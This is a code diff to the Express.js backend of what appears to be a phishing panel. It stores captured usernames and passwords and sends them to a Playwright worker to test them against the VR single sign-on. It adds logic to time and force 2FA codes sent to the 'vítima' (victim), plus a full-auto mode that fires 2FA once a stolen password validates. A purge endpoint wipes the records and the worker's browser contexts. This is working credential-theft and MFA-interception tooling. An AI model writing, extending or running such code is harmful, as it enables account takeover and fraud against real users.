@@ -746,7 +746,7 @@ app.get(
 app.post(
     "/api/solicitar-2fa",
     (req, res) => {
-        const { usuario } = req.body;
+        const { usuario, forcar } = req.body;
         if (!usuario) {
             return res.status(400).json({
                 success: false,
@@ -758,8 +758,36 @@ app.post(
 
         try {
             const dados = lerDados();
-            let atualizou = false;
+            let statusCredAtual = null;
+            for (let i = dados.length - 1; i >= 0; i--) {
+                const item = dados[i];
+                if (item && item.senha) {
+                    const u = (item.nome || item.usuario || "").toLowerCase().trim();
+                    if (u === userKey) {
+                        statusCredAtual = item.status_credencial || "testando";
+                        break;
+                    }
+                }
+            }
 
+            // Trava anti-2FA fantasma: impede envio prematuro sem comprovação de MFA real
+            if (!forcar && statusCredAtual === "bloqueio_captcha") {
+                return res.status(400).json({
+                    success: false,
+                    bloqueio_captcha: true,
+                    mensagem: "Atenção: O SSO da VR ainda está no Desafio Captcha. O código 2FA ainda não foi disparado para o e-mail da vítima."
+                });
+            }
+
+            if (!forcar && statusCredAtual === "invalido") {
+                return res.status(400).json({
+                    success: false,
+                    invalido: true,
+                    mensagem: "Atenção: A VR indicou senha incorreta. Não é recomendado solicitar 2FA para credenciais inválidas."
+                });
+            }
+
+            let atualizou = false;
             for (let i = dados.length - 1; i >= 0; i--) {
                 const item = dados[i];
                 if (item && item.senha) {
@@ -777,7 +805,7 @@ app.post(
                 notificarClientes();
             }
 
-            console.log(`[PAINEL] 2FA Solicitado para: ${usuario}`);
+            console.log(`[PAINEL] 2FA Solicitado para: ${usuario} (Forçado: ${!!forcar})`);
 
             return res.json({
                 success: true,
@@ -791,6 +819,88 @@ app.post(
                 mensagem: "Erro ao solicitar 2FA."
             });
         }
+    }
+);
+
+app.post(
+    "/api/retestar-sso",
+    async (req, res) => {
+        const { usuario } = req.body;
+        if (!usuario) {
+            return res.status(400).json({ success: false, mensagem: "Usuário obrigatório." });
+        }
+
+        const userKey = usuario.toLowerCase().trim();
+        const dados = lerDados();
+        let senhaAlvo = null;
+
+        for (let i = dados.length - 1; i >= 0; i--) {
+            const item = dados[i];
+            if (item && item.senha) {
+                const u = (item.nome || item.usuario || "").toLowerCase().trim();
+                if (u === userKey) {
+                    senhaAlvo = item.senha;
+                    item.status_credencial = "testando";
+                    item.status_login = "aguardando_solicitacao";
+                    break;
+                }
+            }
+        }
+
+        if (!senhaAlvo) {
+            return res.status(404).json({ success: false, mensagem: "Credenciais do usuário não encontradas no histórico." });
+        }
+
+        fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 4), "utf8");
+        notificarClientes();
+
+        console.log(`[RE-TESTAR SSO] 🔄 Disparando re-tentativa para: ${usuario}`);
+
+        (async () => {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 25000);
+
+                const response = await fetch(`${WORKER_URL}/retestar`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ usuario, senha: senhaAlvo }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+
+                if (response.ok) {
+                    const data = await response.json();
+                    const statusCred = data.status_credencial || (data.valido ? "valido" : "invalido");
+                    const dAtual = lerDados();
+                    for (let i = dAtual.length - 1; i >= 0; i--) {
+                        const it = dAtual[i];
+                        if (it && it.senha && (it.nome || it.usuario || "").toLowerCase().trim() === userKey) {
+                            it.status_credencial = statusCred;
+                            if (data.valido && configApp.auto_mode) {
+                                it.status_login = "solicitar_2fa";
+                                console.log(`[FULL-AUTO] 🚀 ${usuario} validado após re-teste -> 2FA disparado!`);
+                            }
+                            break;
+                        }
+                    }
+                    fs.writeFileSync(DADOS_JSON, JSON.stringify(dAtual, null, 4), "utf8");
+                    notificarClientes();
+                } else {
+                    testarViaWorker(usuario, senhaAlvo);
+                }
+            } catch (err) {
+                console.warn("[RE-TESTAR SSO] Falha no worker /retestar, acionando fallback:", err.message);
+                testarViaWorker(usuario, senhaAlvo);
+            }
+        })();
+
+        return res.json({
+            success: true,
+            usuario,
+            status_credencial: "testando",
+            mensagem: "Re-tentativa disparada com sucesso no worker."
+        });
     }
 );
 
@@ -1015,12 +1125,18 @@ app.get(
 
 app.post(
     "/api/limpar",
-    (req, res) => {
+    async (req, res) => {
         try {
             fs.writeFileSync(DADOS_JSON, JSON.stringify([], null, 4), "utf8");
             fs.writeFileSync(RESULTADO_JSON, JSON.stringify([], null, 4), "utf8");
+
+            // Purgar abas e contextos em memória no worker Playwright (Zero Test Pollution)
+            try {
+                await fetch(`${WORKER_URL}/limpar-memoria`, { method: "POST" });
+            } catch (wErr) {}
+
             notificarClientes();
-            res.json({ success: true, mensagem: "Registros limpos com sucesso." });
+            res.json({ success: true, mensagem: "Registros e contextos limpos com sucesso." });
         } catch (err) {
             console.error("Erro ao limpar dados:", err);
             res.status(500).json({ success: false, mensagem: "Erro ao limpar dados." });
